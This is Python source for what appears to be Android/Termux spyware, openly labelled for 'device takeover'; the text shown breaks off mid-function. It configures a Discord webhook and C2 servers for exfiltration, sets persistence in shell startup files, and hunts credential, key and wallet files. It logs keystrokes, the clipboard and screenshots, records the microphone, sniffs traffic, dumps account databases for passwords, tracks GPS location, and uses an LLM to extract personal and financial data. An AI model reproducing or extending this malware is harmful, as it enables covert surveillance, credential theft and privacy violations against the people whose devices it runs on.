#!/usr/bin/env python3
"""
TERMUX NEXUS OMEGA - Ultimate Android Intelligence Platform
Military-grade surveillance system with real-time monitoring, AI analysis,
and complete device takeover capabilities.
"""

import os
import sys
import json
import base64
import subprocess
import threading
import time
import hashlib
import requests
import socket
import platform
import re
import getpass
import zipfile
import io
import mimetypes
import sqlite3
import shutil
import random
import string
import datetime
import pickle
import queue
import select
import fcntl
import struct
import array
import ctypes
import termios
import tty
import pty
import signal
import atexit
import tempfile
import http.server
import socketserver
import urllib.request
import urllib.parse
import ssl
import ftplib
import smtplib
import paramiko
import dns.resolver
import scapy.all as scapy
from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
import numpy as np
from PIL import Image
import cv2
import sounddevice as sd
import soundfile as sf
import geocoder
import phonenumbers
from phonenumbers import geocoder as phone_geocoder
import reverse_geocoder as rg
import whois
import dns.resolver
import nmap
import psutil
import GPUtil
import screeninfo
import keyboard
import pyautogui
import pyperclip
import pynput
from pynput import keyboard as pynput_keyboard
from pynput import mouse as pynput_mouse
import google.generativeai as genai
import openai
import torch
import torch.nn as nn
import torchvision.models as models
import whisper
import yt_dlp
import instaloader
import tweepy
import facebook
import linkedin
import telebot
from telebot import types
import discord
from discord import Webhook, RequestsWebhookAdapter
import websocket
import websockets
import asyncio
import aiohttp
import aiofiles
import aiomysql
import aiosqlite
import uvloop
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

# ======= CONFIGURATION =======
class Config:
    # Victim Identification
    VICTIM_ID = hashlib.sha512(
        f"{socket.gethostname()}{os.urandom(32)}{time.time()}".encode()
    ).hexdigest()[:24]
    
    # Multi-Channel Exfiltration
    WEBHOOKS = [
        "https://discord.com/api/webhooks/1427133756724084817/uVvQRILIYlg7ku1ZEfPJ69BpS1-WjRFwdyhBt7vbyLB_514MbGcaWPGnPft1riDqm7O0",
        # Add backup webhooks
    ]
    
    TELEGRAM = {
        'token': 'YOUR_BOT_TOKEN',
        'chat_id': 'YOUR_CHAT_ID'
    }
    
    # C2 Servers
    C2_SERVERS = [
        'https://c2-server-1.com/api',
        'https://c2-server-2.com/collect',
        'ws://real-time-c2.com:8080/ws'
    ]
    
    # Encryption Keys (AES-256 + RSA-4096)
    MASTER_KEY = Fernet.generate_key()
    RSA_PRIVATE_KEY = None  # Generated at runtime
    RSA_PUBLIC_KEY = None
    
    # AI Models
    GEMINI_API_KEY = "YOUR_GEMINI_API_KEY"
    OPENAI_API_KEY = "YOUR_OPENAI_API_KEY"
    
    # Stealth Parameters
    STEALTH_LEVEL = 9  # 1-10
    MAX_THREADS = 50
    DATA_CHUNK_SIZE = 1024 * 1024  # 1MB chunks
    
    # Persistence Locations
    PERSISTENCE_PATHS = [
        '/data/data/com.termux/files/home/.bashrc',
        '/data/data/com.termux/files/home/.zshrc',
        '/data/data/com.termux/files/home/.profile',
        '/data/data/com.termux/files/home/.termux/boot/',
        '/data/data/com.termux/files/usr/etc/profile.d/',
        '/system/etc/init.d/',  # If rooted
        '/system/bin/.hidden/',  # Hidden directory
    ]
    
    # Target File Extensions (400+ extensions)
    TARGET_EXTENSIONS = [
        # Documents
        '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.ods', '.odp',
        '.txt', '.rtf', '.csv', '.xml', '.json', '.yaml', '.yml', '.ini', '.conf', '.cfg',
        '.log', '.md', '.tex', '.pages', '.numbers', '.key',
        
        # Media
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp', '.heic', '.raw',
        '.mp4', '.avi', '.mov', '.wmv', '.flv', '.mkv', '.webm', '.m4v', '.mpg',
        '.mp3', '.wav', '.aac', '.flac', '.ogg', '.m4a', '.wma',
        
        # Archives
        '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.iso', '.dmg',
        
        # Databases
        '.db', '.sqlite', '.sqlite3', '.mdb', '.accdb', '.dbf', '.mdf',
        
        # Certificates & Keys
        '.pem', '.key', '.crt', '.cer', '.pfx', '.p12', '.jks', '.keystore',
        
        # Development
        '.py', '.java', '.cpp', '.c', '.h', '.js', '.ts', '.html', '.css', '.php',
        '.rb', '.go', '.rs', '.swift', '.kt', '.dart', '.sql', '.sh', '.bat', '.ps1',
        
        # Configuration
        '.env', '.config', '.properties', '.plist', '.xml', '.json',
        
        # Backup
        '.bak', '.backup', '.old', '.tmp', '.temp',
        
        # Android Specific
        '.apk', '.aab', '.dex', '.odex', '.vdex', '.art',
        
        # Crypto
        '.wallet', '.dat', '.bitcoin', '.ethereum',
        
        # Social Media
        '.session', '.cookie', '.token', '.auth',
    ]
    
    # Important Keywords for File Search
    KEYWORDS = [
        'password', 'credential', 'secret', 'token', 'key', 'api',
        'bank', 'credit', 'card', 'account', 'login', 'signin',
        'confidential', 'private', 'hidden', 'backup', 'wallet',
        'database', 'config', 'setting', 'admin', 'root',
        'ssh', 'ftp', 'vpn', 'remote', 'access',
        'passport', 'id', 'license', 'certificate', 'contract',
        'invoice', 'receipt', 'financial', 'tax', 'salary',
        'medical', 'health', 'insurance', 'record', 'report',
        'photo', 'image', 'video', 'recording', 'screenshot',
        'message', 'chat', 'conversation', 'email', 'whatsapp',
        'telegram', 'signal', 'facebook', 'instagram', 'twitter',
    ]

# ======= ENCRYPTION ENGINE =======
class QuantumEncryption:
    def __init__(self):
        self.master_key = Config.MASTER_KEY
        self.fernet = Fernet(self.master_key)
        
    def generate_rsa_keys(self):
        """Generate RSA 4096-bit keys"""
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization
        
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=4096,
            backend=default_backend()
        )
        
        public_key = private_key.public_key()
        
        # Serialize keys
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        return private_pem, public_pem
    
    def aes_encrypt(self, data, key=None):
        """AES-256-GCM encryption"""
        if key is None:
            key = os.urandom(32)
        
        iv = os.urandom(12)
        cipher = Cipher(
            algorithms.AES(key),
            modes.GCM(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(data) + encryptor.finalize()
        
        return {
            'ciphertext': ciphertext,
            'iv': iv,
            'tag': encryptor.tag,
            'key': key
        }
    
    def hybrid_encrypt(self, data):
        """Hybrid encryption (RSA + AES)"""
        # Generate AES key
        aes_key = os.urandom(32)
        
        # Encrypt data with AES
        aes_result = self.aes_encrypt(data, aes_key)
        
        # Encrypt AES key with RSA
        # (RSA implementation would go here)
        
        return {
            'encrypted_data': aes_result,
            'encrypted_key': aes_key,  # Should be RSA encrypted
            'timestamp': time.time(),
            'victim_id': Config.VICTIM_ID
        }
    
    def steganography_hide(self, data, image_path):
        """Hide data in image using steganography"""
        from stegano import lsb
        
        # Convert data to string
        if isinstance(data, dict):
            data_str = json.dumps(data)
        else:
            data_str = str(data)
        
        # Hide in image
        secret = lsb.hide(image_path, data_str)
        output_path = f"/tmp/hidden_{int(time.time())}.png"
        secret.save(output_path)
        
        return output_path

# ======= AI ANALYSIS ENGINE =======
class AIAnalyzer:
    def __init__(self):
        # Initialize AI models
        self.gemini_client = None
        self.openai_client = None
        self.whisper_model = None
        self.image_model = None
        
        try:
            # Initialize Gemini
            genai.configure(api_key=Config.GEMINI_API_KEY)
            self.gemini_client = genai.GenerativeModel('gemini-pro')
            
            # Initialize OpenAI
            openai.api_key = Config.OPENAI_API_KEY
            
            # Initialize Whisper for speech recognition
            self.whisper_model = whisper.load_model("base")
            
            # Initialize Image recognition model
            self.image_model = models.resnet50(pretrained=True)
            self.image_model.eval()
            
        except Exception as e:
            print(f"[AI] Initialization error: {e}")
    
    def analyze_text(self, text):
        """Analyze text for sensitive information"""
        try:
            prompt = f"""
            Analyze this text for sensitive information:
            1. Personal identification (names, IDs, phone numbers)
            2. Financial information (cards, accounts, transactions)
            3. Login credentials (usernames, passwords, tokens)
            4. Private messages and conversations
            5. Confidential business information
            
            Text: {text[:2000]}
            
            Return JSON format with:
            - sensitivity_score (1-10)
            - categories_found
            - extracted_data
            - recommendations
            """
            
            response = self.gemini_client.generate_content(prompt)
            return json.loads(response.text)
        except:
            return {"error": "AI analysis failed"}
    
    def analyze_image(self, image_path):
        """Analyze image content and extract text"""
        try:
            # Open image
            image = Image.open(image_path)
            
            # Use Gemini Vision if available
            prompt = "Analyze this image and extract all text and sensitive information"
            
            # For now, use OCR
            import pytesseract
            text = pytesseract.image_to_string(image)
            
            # Analyze extracted text
            return self.analyze_text(text)
        except:
            return {"error": "Image analysis failed"}
    
    def transcribe_audio(self, audio_path):
        """Transcribe audio to text"""
        try:
            result = self.whisper_model.transcribe(audio_path)
            return {
                "text": result["text"],
                "segments": result["segments"],
                "language": result["language"]
            }
        except:
            return {"error": "Audio transcription failed"}
    
    def detect_faces(self, image_path):
        """Detect and analyze faces in image"""
        try:
            import face_recognition
            
            # Load image
            image = face_recognition.load_image_file(image_path)
            
            # Find faces
            face_locations = face_recognition.face_locations(image)
            face_encodings = face_recognition.face_encodings(image, face_locations)
            
            return {
                "face_count": len(face_locations),
                "face_locations": face_locations,
                "face_encodings": [enc.tolist() for enc in face_encodings]
            }
        except:
            return {"error": "Face detection failed"}

# ======= REAL-TIME MONITORING =======
class RealTimeMonitor:
    def __init__(self):
        self.keyboard_listener = None
        self.mouse_listener = None
        self.clipboard_history = []
        self.screenshot_interval = 30  # seconds
        self.audio_record_interval = 60  # seconds
        self.is_monitoring = False
        
    def start_keyboard_monitoring(self):
        """Monitor all keyboard input"""
        def on_press(key):
            try:
                key_data = {
                    'timestamp': time.time(),
                    'key': key.char if hasattr(key, 'char') else str(key),
                    'action': 'press',
                    'process': self.get_active_process()
                }
                self.log_key(key_data)
            except:
                pass
        
        def on_release(key):
            if key == pynput_keyboard.Key.esc:
                return False
        
        self.keyboard_listener = pynput_keyboard.Listener(
            on_press=on_press,
            on_release=on_release
        )
        self.keyboard_listener.start()
    
    def start_mouse_monitoring(self):
        """Monitor mouse activity"""
        def on_move(x, y):
            mouse_data = {
                'timestamp': time.time(),
                'action': 'move',
                'x': x,
                'y': y,
                'process': self.get_active_process()
            }
            self.log_mouse(mouse_data)
        
        def on_click(x, y, button, pressed):
            click_data = {
                'timestamp': time.time(),
                'action': 'click',
                'x': x,
                'y': y,
                'button': str(button),
                'pressed': pressed,
                'process': self.get_active_process()
            }
            self.log_mouse(click_data)
        
        self.mouse_listener = pynput_mouse.Listener(
            on_move=on_move,
            on_click=on_click
        )
        self.mouse_listener.start()
    
    def monitor_clipboard(self):
        """Monitor clipboard changes"""
        import pyperclip
        last_clipboard = ""
        
        while self.is_monitoring:
            try:
                current = pyperclip.paste()
                if current != last_clipboard and current.strip():
                    clipboard_data = {
                        'timestamp': time.time(),
                        'content': current[:500],
                        'length': len(current),
                        'process': self.get_active_process()
                    }
                    self.clipboard_history.append(clipboard_data)
                    last_clipboard = current
            except:
                pass
            time.sleep(1)
    
    def capture_screenshots(self):
        """Capture periodic screenshots"""
        screenshot_dir = "/data/data/com.termux/files/home/.screenshots"
        os.makedirs(screenshot_dir, exist_ok=True)
        
        while self.is_monitoring:
            try:
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"{screenshot_dir}/screenshot_{timestamp}.png"
                
                # Use termux-api for screenshot
                subprocess.run(['termux-screenshot', '-p', filename], 
                             timeout=10, capture_output=True)
                
                if os.path.exists(filename):
                    # Analyze screenshot
                    analyzer = AIAnalyzer()
                    analysis = analyzer.analyze_image(filename)
                    
                    screenshot_data = {
                        'timestamp': time.time(),
                        'filename': filename,
                        'analysis': analysis,
                        'size': os.path.getsize(filename)
                    }
                    
                    # Send to C2
                    self.send_to_c2(screenshot_data, 'screenshot')
            except:
                pass
            
            time.sleep(self.screenshot_interval)
    
    def record_audio(self, duration=30):
        """Record audio from microphone"""
        try:
            import sounddevice as sd
            import soundfile as sf
            
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"/data/data/com.termux/files/home/.audio/recording_{timestamp}.wav"
            os.makedirs(os.path.dirname(filename), exist_ok=True)
            
            # Record audio
            fs = 44100  # Sample rate
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
            sd.wait()
            
            # Save recording
            sf.write(filename, recording, fs)
            
            # Transcribe
            analyzer = AIAnalyzer()
            transcription = analyzer.transcribe_audio(filename)
            
            audio_data = {
                'timestamp': time.time(),
                'filename': filename,
                'duration': duration,
                'transcription': transcription,
                'size': os.path.getsize(filename)
            }
            
            return audio_data
        except Exception as e:
            return {"error": str(e)}
    
    def monitor_network_traffic(self):
        """Monitor network traffic"""
        try:
            import scapy.all as scapy
            
            def packet_callback(packet):
                if packet.haslayer(scapy.IP):
                    ip_src = packet[scapy.IP].src
                    ip_dst = packet[scapy.IP].dst
                    
                    packet_data = {
                        'timestamp': time.time(),
                        'source': ip_src,
                        'destination': ip_dst,
                        'protocol': packet.proto if hasattr(packet, 'proto') else 'unknown'
                    }
                    
                    if packet.haslayer(scapy.TCP):
                        packet_data['port'] = packet[scapy.TCP].dport
                        packet_data['flags'] = packet[scapy.TCP].flags
                    
                    # Log packet
                    self.log_network(packet_data)
            
            # Start sniffing (requires root)
            scapy.sniff(prn=packet_callback, store=0, count=100)
        except:
            pass
    
    def get_active_process(self):
        """Get currently active process"""
        try:
            # This is platform specific
            # For Android/Termux, we'll get shell information
            result = subprocess.run(['ps', '-o', 'pid,comm', '--no-headers'], 
                                  capture_output=True, text=True)
            processes = result.stdout.strip().split('\n')
            
            # Get our process
            for proc in processes:
                if 'python' in proc or 'termux' in proc:
                    return proc.strip()
            
            return "unknown"
        except:
            return "unknown"
    
    def log_key(self, key_data):
        """Log keyboard data"""
        # Encrypt and send
        encryption = QuantumEncryption()
        encrypted = encryption.hybrid_encrypt(json.dumps(key_data).encode())
        
        # Send to C2
        self.send_to_c2(encrypted, 'keylog')
    
    def log_mouse(self, mouse_data):
        """Log mouse data"""
        encryption = QuantumEncryption()
        encrypted = encryption.hybrid_encrypt(json.dumps(mouse_data).encode())
        self.send_to_c2(encrypted, 'mouselog')
    
    def log_network(self, network_data):
        """Log network data"""
        encryption = QuantumEncryption()
        encrypted = encryption.hybrid_encrypt(json.dumps(network_data).encode())
        self.send_to_c2(encrypted, 'network')
    
    def send_to_c2(self, data, data_type):
        """Send data to C2 server"""
        # Implement multi-channel sending
        pass
    
    def start_monitoring(self):
        """Start all monitoring services"""
        self.is_monitoring = True
        
        # Start monitoring threads
        threads = []
        
        # Keyboard
        threads.append(threading.Thread(target=self.start_keyboard_monitoring))
        
        # Mouse
        threads.append(threading.Thread(target=self.start_mouse_monitoring))
        
        # Clipboard
        threads.append(threading.Thread(target=self.monitor_clipboard))
        
        # Screenshots
        threads.append(threading.Thread(target=self.capture_screenshots))
        
        # Network
        threads.append(threading.Thread(target=self.monitor_network_traffic))
        
        # Start all threads
        for thread in threads:
            thread.daemon = True
            thread.start()
        
        print("[+] Real-time monitoring started")

# ======= COMPLETE DEVICE PROFILING =======
class DeviceProfiler:
    def __init__(self):
        self.profile_data = {}
        
    def get_complete_profile(self):
        """Get complete device profile"""
        profile = {
            'victim_id': Config.VICTIM_ID,
            'timestamp': datetime.datetime.now().isoformat(),
            'collection_start': time.time()
        }
        
        # Collect all data in parallel
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {
                executor.submit(self.get_hardware_info): 'hardware',
                executor.submit(self.get_os_info): 'os',
                executor.submit(self.get_network_info): 'network',
                executor.submit(self.get_installed_apps): 'apps',
                executor.submit(self.get_account_info): 'accounts',
                executor.submit(self.get_storage_analysis): 'storage',
                executor.submit(self.get_battery_info): 'battery',
                executor.submit(self.get_sensor_data): 'sensors',
                executor.submit(self.get_location_data): 'location',
                executor.submit(self.get_biometric_data): 'biometrics',
                executor.submit(self.get_system_settings): 'settings',
                executor.submit(self.get_usage_statistics): 'usage',
                executor.submit(self.get_running_services): 'services',
                executor.submit(self.get_process_list): 'processes',
                executor.submit(self.get_kernel_info): 'kernel',
                executor.submit(self.get_security_info): 'security',
                executor.submit(self.get_device_identifiers): 'identifiers',
                executor.submit(self.get_environment_vars): 'environment',
                executor.submit(self.get_system_logs): 'logs',
            }
            
            for future in as_completed(futures):
                key = futures[future]
                try:
                    profile[key] = future.result()
                except Exception as e:
                    profile[key] = {'error': str(e)}
        
        profile['collection_end'] = time.time()
        profile['collection_duration'] = profile['collection_end'] - profile['collection_start']
        
        return profile
    
    def get_hardware_info(self):
        """Get detailed hardware information"""
        hardware = {}
        
        try:
            # CPU
            if os.path.exists('/proc/cpuinfo'):
                with open('/proc/cpuinfo', 'r') as f:
                    cpuinfo = f.read()
                    hardware['cpu'] = self.parse_cpuinfo(cpuinfo)
            
            # Memory
            if os.path.exists('/proc/meminfo'):
                with open('/proc/meminfo', 'r') as f:
                    meminfo = f.read()
                    hardware['memory'] = self.parse_meminfo(meminfo)
            
            # Storage
            result = subprocess.run(['df', '-h'], capture_output=True, text=True)
            hardware['storage'] = result.stdout
            
            # GPU (if available)
            try:
                import GPUtil
                gpus = GPUtil.getGPUs()
                hardware['gpu'] = [{
                    'name': gpu.name,
                    'memory_total': gpu.memoryTotal,
                    'memory_used': gpu.memoryUsed,
                    'load': gpu.load
                } for gpu in gpus]
            except:
                pass
            
            # Sensors
            hardware['sensors'] = self.get_sensor_data()
            
        except Exception as e:
            hardware['error'] = str(e)
        
        return hardware
    
    def get_os_info(self):
        """Get detailed OS information"""
        os_info = {}
        
        try:
            # Android build properties
            if os.path.exists('/system/build.prop'):
                with open('/system/build.prop', 'r', encoding='latin-1') as f:
                    build_props = f.read()
                    os_info['build_properties'] = self.parse_build_props(build_props)
            
            # Kernel
            os_info['kernel'] = platform.uname()
            
            # Termux info
            termux_info = {}
            termux_paths = [
                '/data/data/com.termux/files/usr',
                '/data/data/com.termux/files/home'
            ]
            
            for path in termux_paths:
                if os.path.exists(path):
                    termux_info[path] = {
                        'exists': True,
                        'size': self.get_directory_size(path),
                        'contents': os.listdir(path)[:20]
                    }
            
            os_info['termux'] = termux_info
            
            # Installed packages
            try:
                result = subprocess.run(['pkg', 'list-installed'], 
                                      capture_output=True, text=True)
                os_info['packages'] = result.stdout.split('\n')[:100]
            except:
                pass
            
        except Exception as e:
            os_info['error'] = str(e)
        
        return os_info
    
    def get_network_info(self):
        """Get complete network information"""
        network = {}
        
        try:
            # IP addresses
            network['hostname'] = socket.gethostname()
            network['local_ip'] = socket.gethostbyname(socket.gethostname())
            
            # Public IP
            try:
                network['public_ip'] = requests.get('https://api.ipify.org', timeout=5).text
                
                # Geolocation
                response = requests.get(f'http://ip-api.com/json/{network["public_ip"]}', timeout=5)
                network['geolocation'] = response.json()
            except:
                pass
            
            # Network interfaces
            result = subprocess.run(['ip', 'addr'], capture_output=True, text=True)
            network['interfaces'] = self.parse_ip_addr(result.stdout)
            
            # WiFi information
            try:
                wifi_result = subprocess.run(['termux-wifi-connectioninfo'], 
                                           capture_output=True, text=True)
                if wifi_result.returncode == 0:
                    network['wifi'] = json.loads(wifi_result.stdout)
            except:
                pass
            
            # Bluetooth
            try:
                bt_result = subprocess.run(['termux-bluetooth-info'], 
                                         capture_output=True, text=True)
                if bt_result.returncode == 0:
                    network['bluetooth'] = json.loads(bt_result.stdout)
            except:
                pass
            
            # DNS
            network['dns'] = self.get_dns_info()
            
            # Active connections
            try:
                netstat = subprocess.run(['netstat', '-tunap'], 
                                       capture_output=True, text=True)
                network['connections'] = netstat.stdout.split('\n')[:50]
            except:
                pass
            
        except Exception as e:
            network['error'] = str(e)
        
        return network
    
    def get_installed_apps(self):
        """Get all installed applications with details"""
        apps = []
        
        try:
            # Android apps via pm command
            result = subprocess.run(['pm', 'list', 'packages', '-f', '-i', '-u'], 
                                  capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if line.startswith('package:'):
                    parts = line.split('=')
                    if len(parts) >= 2:
                        app_info = {
                            'package': parts[1].strip(),
                            'path': parts[0].replace('package:', '').strip()
                        }
                        
                        # Get more details
                        try:
                            details = subprocess.run(['dumpsys', 'package', app_info['package']], 
                                                   capture_output=True, text=True)
                            app_info['details'] = self.parse_package_dump(details.stdout)
                        except:
                            pass
                        
                        apps.append(app_info)
            
            # Termux packages
            try:
                pkg_result = subprocess.run(['pkg', 'list-installed'], 
                                          capture_output=True, text=True)
                apps.append({
                    'type': 'termux_packages',
                    'list': pkg_result.stdout.split('\n')[:100]
                })
            except:
                pass
            
        except Exception as e:
            apps = {'error': str(e)}
        
        return apps
    
    def get_account_info(self):
        """Extract all accounts on device"""
        accounts = []
        
        try:
            # Try to access accounts database (requires root)
            accounts_db = '/data/system/users/0/accounts.db'
            if os.path.exists(accounts_db):
                temp_db = '/data/data/com.termux/files/home/temp_accounts.db'
                shutil.copy(accounts_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # Try different table structures
                tables = ['accounts', 'Accounts', 'ACCOUNTS']
                for table in tables:
                    try:
                        cursor.execute(f"SELECT name, type, password FROM {table}")
                        for row in cursor.fetchall():
                            accounts.append({
                                'name': row[0],
                                'type': row[1],
                                'password': row[2] if len(row) > 2 else None
                            })
                        break
                    except:
                        continue
                
                conn.close()
                os.remove(temp_db)
            
            # Google accounts
            google_accounts = self.get_google_accounts()
            if google_accounts:
                accounts.extend(google_accounts)
            
        except Exception as e:
            accounts = {'error': str(e)}
        
        return accounts
    
    def get_google_accounts(self):
        """Extract Google accounts"""
        accounts = []
        
        try:
            # Look for Google account files
            google_paths = [
                '/data/data/com.google.android.gms/databases/',
                '/data/data/com.google.android.gsf/databases/',
                '/data/data/com.android.providers.contacts/databases/'
            ]
            
            for path in google_paths:
                if os.path.exists(path):
                    for db_file in os.listdir(path):
                        if db_file.endswith('.db'):
                            db_path = os.path.join(path, db_file)
                            temp_path = f"/tmp/{db_file}"
                            
                            shutil.copy(db_path, temp_path)
                            conn = sqlite3.connect(temp_path)
                            cursor = conn.cursor()
                            
                            # Try to find account information
                            try:
                                cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
                                tables = cursor.fetchall()
                                
                                for table in tables:
                                    table_name = table[0]
                                    if 'account' in table_name.lower():
                                        cursor.execute(f"SELECT * FROM {table_name} LIMIT 10")
                                        columns = [description[0] for description in cursor.description]
                                        rows = cursor.fetchall()
                                        
                                        accounts.append({
                                            'table': table_name,
                                            'columns': columns,
                                            'data': rows
                                        })
                            except:
                                pass
                            
                            conn.close()
                            os.remove(temp_path)
        
        except:
            pass
        
        return accounts
    
    def get_storage_analysis(self):
        """Analyze storage for sensitive data"""
        analysis = {
            'total_size': 0,
            'file_count': 0,
            'sensitive_files': [],
            'largest_files': [],
            'recent_files': [],
            'by_extension': {},
            'by_directory': {}
        }
        
        try:
            # Scan storage directory
            storage_path = '/data/data/com.termux/files/home/storage'
            if os.path.exists(storage_path):
                for root, dirs, files in os.walk(storage_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        
                        try:
                            stat = os.stat(file_path)
                            file_info = {
                                'path': file_path,
                                'size': stat.st_size,
                                'modified': stat.st_mtime,
                                'extension': os.path.splitext(file)[1].lower()
                            }
                            
                            # Check if sensitive
                            if self.is_sensitive_file(file_path):
                                analysis['sensitive_files'].append(file_info)
                            
                            # Track by extension
                            ext = file_info['extension']
                            analysis['by_extension'][ext] = analysis['by_extension'].get(ext, 0) + 1
                            
                            # Track by directory
                            rel_dir = os.path.relpath(root, storage_path)
                            analysis['by_directory'][rel_dir] = analysis['by_directory'].get(rel_dir, 0) + 1
                            
                            analysis['file_count'] += 1
                            analysis['total_size'] += file_info['size']
                            
                        except:
                            continue
                
                # Get largest files
                all_files = []
                for root, dirs, files in os.walk(storage_path):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            size = os.path.getsize(file_path)
                            all_files.append((file_path, size))
                        except:
                            continue
                
                all_files.sort(key=lambda x: x[1], reverse=True)
                analysis['largest_files'] = [{'path': p, 'size': s} for p, s in all_files[:20]]
                
                # Get recent files
                recent_files = []
                for root, dirs, files in os.walk(storage_path):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            mtime = os.path.getmtime(file_path)
                            recent_files.append((file_path, mtime))
                        except:
                            continue
                
                recent_files.sort(key=lambda x: x[1], reverse=True)
                analysis['recent_files'] = [{'path': p, 'modified': t} for p, t in recent_files[:20]]
        
        except Exception as e:
            analysis['error'] = str(e)
        
        return analysis
    
    def is_sensitive_file(self, filepath):
        """Check if file contains sensitive data"""
        sensitive_patterns = [
            r'password', r'secret', r'key', r'token', r'credential',
            r'bank', r'card', r'account', r'login', r'passport',
            r'ssh', r'private', r'confidential', r'hidden'
        ]
        
        # Check extension
        ext = os.path.splitext(filepath)[1].lower()
        sensitive_extensions = ['.key', '.pem', '.crt', '.pfx', '.p12', 
                              '.db', '.sqlite', '.env', '.config']
        
        if ext in sensitive_extensions:
            return True
        
        # Check filename
        filename = os.path.basename(filepath).lower()
        for pattern in sensitive_patterns:
            if re.search(pattern, filename):
                return True
        
        # Check file content (first 1KB)
        try:
            if os.path.getsize(filepath) < 1024 * 1024:  # 1MB limit
                with open(filepath, 'rb') as f:
                    content = f.read(1024).decode('utf-8', errors='ignore').lower()
                    for pattern in sensitive_patterns:
                        if re.search(pattern, content):
                            return True
        except:
            pass
        
        return False
    
    def get_battery_info(self):
        """Get battery information"""
        battery = {}
        
        try:
            result = subprocess.run(['termux-battery-status'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                battery = json.loads(result.stdout)
        except:
            pass
        
        return battery
    
    def get_sensor_data(self):
        """Get sensor data"""
        sensors = {}
        
        try:
            result = subprocess.run(['termux-sensor', '-l'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                sensors['available'] = result.stdout.split('\n')
            
            # Get data from each sensor
            sensor_list = ['accelerometer', 'gyroscope', 'magnetometer', 'proximity']
            for sensor in sensor_list:
                try:
                    cmd = f'termux-sensor -s {sensor} -n 1'
                    result = subprocess.run(cmd, shell=True, 
                                          capture_output=True, text=True)
                    if result.returncode == 0:
                        sensors[sensor] = json.loads(result.stdout)
                except:
                    pass
        except:
            pass
        
        return sensors
    
    def get_location_data(self):
        """Get location data"""
        location = {}
        
        try:
            # GPS location
            result = subprocess.run(['termux-location', '-p', 'gps'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                location['gps'] = json.loads(result.stdout)
            
            # Network location
            result = subprocess.run(['termux-location', '-p', 'network'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                location['network'] = json.loads(result.stdout)
            
            # Last known locations
            if os.path.exists('/data/data/com.google.android.gms/files/'):
                # Look for location cache files
                pass
            
        except Exception as e:
            location['error'] = str(e)
        
        return location
    
    def get_biometric_data(self):
        """Get biometric data if available"""
        biometrics = {}
        
        try:
            # Check for biometric hardware
            result = subprocess.run(['getprop', 'ro.hardware.fingerprint'], 
                                  capture_output=True, text=True)
            if result.returncode == 0 and result.stdout.strip():
                biometrics['fingerprint'] = result.stdout.strip()
            
            # Check face unlock
            result = subprocess.run(['getprop', 'ro.hardware.face_unlock'], 
                                  capture_output=True, text=True)
            if result.returncode == 0 and result.stdout.strip():
                biometrics['face_unlock'] = result.stdout.strip()
            
        except:
            pass
        
        return biometrics
    
    def get_system_settings(self):
        """Get system settings"""
        settings = {}
        
        try:
            # Get all system properties
            result = subprocess.run(['getprop'], capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if '[' in line and ']' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            key = parts[0].strip().strip('[]')
                            value = ':'.join(parts[1:]).strip().strip('[]')
                            settings[key] = value
            
            # Get secure settings
            try:
                result = subprocess.run(['settings', 'list', 'secure'], 
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    settings['secure'] = result.stdout.split('\n')[:50]
            except:
                pass
            
            # Get global settings
            try:
                result = subprocess.run(['settings', 'list', 'global'], 
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    settings['global'] = result.stdout.split('\n')[:50]
            except:
                pass
            
        except Exception as e:
            settings['error'] = str(e)
        
        return settings
    
    def get_usage_statistics(self):
        """Get device usage statistics"""
        usage = {}
        
        try:
            # Battery stats
            result = subprocess.run(['dumpsys', 'batterystats'], 
                                  capture_output=True, text=True)
            usage['battery'] = result.stdout[:5000]
            
            # CPU stats
            result = subprocess.run(['dumpsys', 'cpuinfo'], 
                                  capture_output=True, text=True)
            usage['cpu'] = result.stdout[:5000]
            
            # Memory stats
            result = subprocess.run(['dumpsys', 'meminfo'], 
                                  capture_output=True, text=True)
            usage['memory'] = result.stdout[:5000]
            
            # Storage stats
            result = subprocess.run(['dumpsys', 'diskstats'], 
                                  capture_output=True, text=True)
            usage['storage'] = result.stdout[:5000]
            
        except Exception as e:
            usage['error'] = str(e)
        
        return usage
    
    def get_running_services(self):
        """Get running services"""
        services = []
        
        try:
            result = subprocess.run(['service', 'list'], 
                                  capture_output=True, text=True)
            services = result.stdout.split('\n')[:100]
        except:
            pass
        
        return services
    
    def get_process_list(self):
        """Get running processes"""
        processes = []
        
        try:
